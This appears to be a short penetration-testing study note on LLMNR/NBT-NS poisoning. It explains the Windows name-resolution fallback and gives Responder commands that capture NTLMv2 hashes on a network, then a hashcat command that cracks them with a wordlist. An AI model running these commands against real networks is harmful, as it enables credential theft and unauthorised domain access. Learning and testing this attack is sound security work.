# LLMNR/NBT-NS Poisoning-Linux

which in this cycle we seek to foothold on the domain

when windows try to communicate with machine using DNS and failed, it start to use another ways

* LLMNR(UDP port 5355)
* NBT-NS(UDP 137)

which these protocols send a broadcast to all devices searching about machine call `ex: printer01`

in this case we use Tool call `responder` which respond as a fake machine to dump credential

```bash
sudo responder -I eth0 -wrf

sudo responder -I ens224 
```

**Crack NTLM Hash**

```bash
hashcat -m 5600 forend_ntlmv2 rockyou.txt
```
